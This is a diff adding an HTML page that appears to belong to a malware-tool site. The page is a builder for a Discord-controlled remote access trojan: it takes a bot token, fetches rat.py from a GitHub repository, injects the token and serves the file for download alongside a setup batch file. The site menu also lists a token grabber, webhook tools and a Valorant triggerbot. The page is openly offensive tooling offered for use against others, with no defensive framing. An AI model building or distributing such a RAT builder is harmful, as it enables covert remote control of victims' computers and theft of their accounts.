@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Rat File</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="border-top">
+        <div class="dropdown-container">
+            <div class="dropdown">
+                <button class="dropdown-btn">Discord</button>
+                <div class="dropdown-menu">
+                    <a href="discord-grabberFile.html">Grabber</a>
+                    <a href="discord-ratFile.html" style="font-weight: 1000;">Rat</a>
+                    <a href="discord-tokenInfo.html">Token Info</a>
+                    <a href="discord-idInfo.html">ID Info</a>
+                    <a href="discord-webhookSender.html">Hook Sender</a>
+                    <a href="discord-webhookDeleter.html">Hook Deleter</a>
+                </div>
+            </div>
+            <div class="dropdown">
+                <button class="dropdown-btn">Valorant</button>
+                <div class="dropdown-menu">
+                    <a href="valorant-triggerbotFile.html">Triggerbot</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h1><u>Discord Rat File</u></h1>
+        <textarea name="" id="botTokenText" placeholder="bot token (admin rights)" cols="40" rows="5"></textarea>
+        <button type="button" class="btn" onclick="downloadRatSetupFile()">Download Setup File</button>
+        <button type="button" class="btn" onclick="getRatFile(document.getElementById('botTokenText').value)">Download Rat File</button>
+        <a href="files/setup-ratTool.bat" id="setupFile"></a>
+    </div>
+</body>
+</html>
+<script>
+    async function getRatFile(botToken) {
+        if(botToken) {
+
+            try {
+                // URL der Datei auf GitHub
+                const url = 'https://raw.githubusercontent.com/Paloox/discordRatFile/main/rat.py';
+                // Datei von GitHub abrufen
+                const response = await fetch(url);
+                if (!response.ok) throw new Error('Network response was not ok');
+                let text = await response.text();
+                // Wort ersetzen
+                const originalWord = 'BOT_TOKEN';
+                const newWord = botToken;
+                const modifiedText = text.replace(new RegExp(originalWord, 'g'), newWord);
+                // Blob-Datei erstellen
+                const blob = new Blob([modifiedText], { type: 'text/plain' });
+                const urlBlob = URL.createObjectURL(blob);
+                // Download-Link erstellen
+                let a = document.createElement('a');
+                a.href = urlBlob;
+                a.download = 'discordRat.py';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                // URL wieder freigeben
+                URL.revokeObjectURL(urlBlob);
+
+
+            } catch (error) {
+                console.error('Error fetching or modifying the file:', error);
+            }
+        } else {
+            alert("Wrong Bot Token");
+        }
+    }
+
+    function downloadRatSetupFile() {
+        document.getElementById('setupFile').click();
+    }
+</script>
